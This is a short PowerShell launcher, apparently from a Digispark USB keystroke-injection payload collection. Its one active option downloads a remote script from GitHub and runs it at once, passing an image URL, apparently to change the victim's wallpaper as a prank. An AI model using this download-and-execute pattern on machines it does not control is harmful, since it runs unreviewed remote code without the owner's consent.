param([int]$Method=0)

switch($Method){
    1{&([scriptblock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/methods/change_wallpaper.ps1'))) 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/assets/images/chungus.jpeg'}
    default{return}
}